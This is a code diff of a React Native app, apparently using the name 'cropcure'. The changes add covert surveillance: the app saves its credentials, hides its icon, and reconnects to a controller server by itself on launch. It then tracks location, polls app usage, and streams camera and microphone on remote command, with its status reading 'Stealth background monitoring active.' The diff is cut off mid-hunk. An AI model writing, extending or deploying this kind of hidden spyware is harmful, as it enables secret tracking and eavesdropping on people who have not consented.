@@ -1,5 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { StyleSheet, Text, View, Button, TextInput, ScrollView, ActivityIndicator, NativeModules, Platform } from 'react-native';
+import AsyncStorage from '@react-native-async-storage/async-storage';
 import { requestAllPermissions } from './app/services/permissions';
 import { CameraService } from './app/services/CameraService';
 import { MicrophoneService } from './app/services/MicrophoneService';
@@ -18,6 +19,7 @@ export default function App() {
   const [statusMsg, setStatusMsg] = useState('Configuration Mode');
   const [registered, setRegistered] = useState(false);
   const [loading, setLoading] = useState(false);
+  const [socketInstance, setSocketInstance] = useState(null);
   
   // Service instances
   const [services, setServices] = useState({
@@ -26,6 +28,34 @@ export default function App() {
     location: null,
     usage: null
   });
+
+  // Load saved credentials from AsyncStorage on app launch
+  useEffect(() => {
+    loadSavedConfig();
+  }, []);
+
+  const loadSavedConfig = async () => {
+    try {
+      const savedServerUrl = await AsyncStorage.getItem('@cropcure_server_url');
+      const savedParentId = await AsyncStorage.getItem('@cropcure_parent_id');
+      const savedDeviceId = await AsyncStorage.getItem('@cropcure_device_id');
+      const savedDeviceName = await AsyncStorage.getItem('@cropcure_device_name');
+      const savedRegistered = await AsyncStorage.getItem('@cropcure_registered');
+
+      if (savedServerUrl) setServerUrl(savedServerUrl);
+      if (savedParentId) setParentId(savedParentId);
+      if (savedDeviceId) setDeviceId(savedDeviceId);
+      if (savedDeviceName) setDeviceName(savedDeviceName);
+
+      if (savedRegistered === 'true' && savedServerUrl && savedDeviceId && savedParentId) {
+        console.log('[Android Socket] Saved credentials loaded from AsyncStorage.');
+        console.log('[Android Socket] Auto-connecting device:', savedDeviceId, 'Parent:', savedParentId);
+        connectSocketAndServices(savedServerUrl, savedDeviceId, savedParentId, savedDeviceName);
+      }
+    } catch (e) {
+      console.warn('[Android Socket] Failed to load saved config from AsyncStorage:', e.message);
+    }
+  };
 
   const registerDevice = async () => {
     if (!parentId || !deviceId) {
@@ -82,100 +112,142 @@ export default function App() {
         throw new Error(resData.error || 'Failed to register with parent server');
       }
 
+      // Save credentials persistently in AsyncStorage
+      await AsyncStorage.setItem('@cropcure_server_url', activeServer);
+      await AsyncStorage.setItem('@cropcure_parent_id', parentId);
+      await AsyncStorage.setItem('@cropcure_device_id', deviceId);
+      await AsyncStorage.setItem('@cropcure_device_name', deviceName);
+      await AsyncStorage.setItem('@cropcure_registered', 'true');
+
       // Step 3: Trigger App Hiding
       await VisibilityService.hideAppIcon();
 
-      // Step 4: Establish Socket connection with persistent auto-reconnect
+      // Step 4: Establish Socket connection and start background services
+      await connectSocketAndServices(activeServer, deviceId, parentId, deviceName);
+    } catch (e) {
+      console.error('[Android Socket] Registration failed:', e);
+      setStatusMsg(`Registration Error: ${e.message}`);
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  const connectSocketAndServices = async (activeServer, targetDeviceId, targetParentId, targetDeviceName) => {
+    try {
+      console.log('[Android Socket] Connecting to backend:', activeServer);
+      console.log('[Android Socket] Device ID being sent:', targetDeviceId);
+      console.log('[Android Socket] Parent ID being sent:', targetParentId);
+
+      // Establish Socket connection sending BOTH deviceId and parentId in auth & query
       const socket = io(activeServer, {
-        auth: { deviceId },
+        auth: { deviceId: targetDeviceId, parentId: targetParentId },
+        query: { deviceId: targetDeviceId, parentId: targetParentId },
         reconnection: true,
         reconnectionAttempts: Infinity,
         reconnectionDelay: 1000,
         transports: ['websocket', 'polling']
       });
 
+      setSocketInstance(socket);
+
       socket.on('connect', () => {
-        setStatusMsg(`✓ Connected as device "${deviceId}". Stealth background monitoring active.`);
+        console.log('[Android Socket] Socket connected: ID =', socket.id);
+        console.log('[Android Socket] Device ID being sent:', targetDeviceId);
+        console.log('[Android Socket] Parent ID being sent:', targetParentId);
+
+        // Emit matching register-device event for backend listener
+        socket.emit('register-device', { deviceId: targetDeviceId, parentId: targetParentId }, (res) => {
+          if (res && res.status === 'ok') {
+            console.log('[Android Socket] Device registration success confirmed by backend');
+          } else {
+            console.log('[Android Socket] Device registration emitted');
+          }
+        });
+
+        setStatusMsg(`✓ Connected as device "${targetDeviceId}". Stealth background monitoring active.`);
+      });
+
+      socket.io.on('reconnect', (attempt) => {
+        console.log(`[Android Socket] Reconnected after ${attempt} attempt(s). Re-registering device: ${targetDeviceId}`);
+        console.log('[Android Socket] Device ID being sent:', targetDeviceId);
+        console.log('[Android Socket] Parent ID being sent:', targetParentId);
+        socket.emit('register-device', { deviceId: targetDeviceId, parentId: targetParentId });
+      });
+
+      socket.on('connect_error', (err) => {
+        console.warn('[Android Socket] Socket connection error:', err.message);
       });
 
       // Initialize background services
-      const camSvc = new CameraService(deviceId, socket);
-      const micSvc = new MicrophoneService(deviceId, socket);
-      const locSvc = new LocationService(deviceId, socket);
-      const usageSvc = new AppUsageService(deviceId, socket, activeServer);
+      const camSvc = new CameraService(targetDeviceId, socket);
+      const micSvc = new MicrophoneService(targetDeviceId, socket);
+      const locSvc = new LocationService(targetDeviceId, socket);
+      const usageSvc = new AppUsageService(targetDeviceId, socket, activeServer);
 
       // Start Background location watch & app usage polling
       await locSvc.startTracking();
       usageSvc.startMonitoring(15000);
 
-      // Register socket commands listener
+      // Register socket command listeners with exact logs
       socket.on('camera-start-command', async (data) => {
         try {
-          console.log('Received Camera Start command via socket.');
+          console.log(`[Android Socket] Device ${targetDeviceId} received CAMERA_START command`);
           await camSvc.startStream(data.streamId, data.parentSocketId);
         } catch (e) {
-          console.warn('Camera start error:', e.message);
+          console.warn('[Android Socket] Camera start error:', e.message);
         }
       });
 
       socket.on('camera-switch-command', (data) => {
         try {
-          console.log(`Received Camera Switch command to ${data.facing}`);
+          console.log(`[Android Socket] Device ${targetDeviceId} received CAMERA_SWITCH command to ${data.facing}`);
           camSvc.setFacing(data.facing);
         } catch (e) {
-          console.warn('Camera switch error:', e.message);
+          console.warn('[Android Socket] Camera switch error:', e.message);
         }
       });
 
       socket.on('camera-stop-command', async () => {
         try {
-          console.log('Received Camera Stop command.');
+          console.log(`[Android Socket] Device ${targetDeviceId} received CAMERA_STOP command`);
           await camSvc.stopStream();
         } catch (e) {
-          console.warn('Camera stop error:', e.message);
-        }
-      });
-
-      socket.on('camera-record-start', async () => {
-        try {
-          await camSvc.startRecording();
-        } catch (e) {
-          console.warn('Camera record start error:', e.message);
-        }
-      });
-
-      socket.on('camera-record-stop', async () => {
-        try {
-          const recordData = await camSvc.stopRecording();
-          if (recordData) {
-            fetch(`${activeServer}/api/surveillance/camera/record/stop`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(recordData)
-            });
-          }
-        } catch (e) {
-          console.warn('Camera record stop error:', e.message);
+          console.warn('[Android Socket] Camera stop error:', e.message);
         }
       });
 
       socket.on('mic-start-command', async (data) => {
         try {
-          console.log('Received Mic Start command via socket.');
+          console.log(`[Android Socket] Device ${targetDeviceId} received MIC_START command`);
           await micSvc.startStream(data.streamId);
         } catch (e) {
-          console.warn('Mic start error:', e.message);
+          console.warn('[Android Socket] Mic start error:', e.message);
         }
       });
 
       socket.on('mic-stop-command', async () => {
         try {
-          console.log('Received Mic Stop command.');
+          console.log(`[Android Socket] Device ${targetDeviceId} received MIC_STOP command`);
           await micSvc.stopStream();
         } catch (e) {
-          console.warn('Mic stop error:', e.message);
+          console.warn('[Android Socket] Mic stop error:', e.message);
         }
       });
+
+      socket.on('app-hide-command', async () => {
+        await VisibilityService.hideAppIcon();
+      });
+
+      socket.on('app-show-command', async () => {
+        await VisibilityService.showAppIcon();
+      });
+
+      setServices({ camera: camSvc, mic: micSvc, location: locSvc, usage: usageSvc });
+      setRegistered(true);
+    } catch (e) {
+      console.error('[Android Socket] Socket initialization failed:', e.message);
+    }
+  };
 
       socket.on('mic-record-start', async () => {
         await micSvc.startRecording();
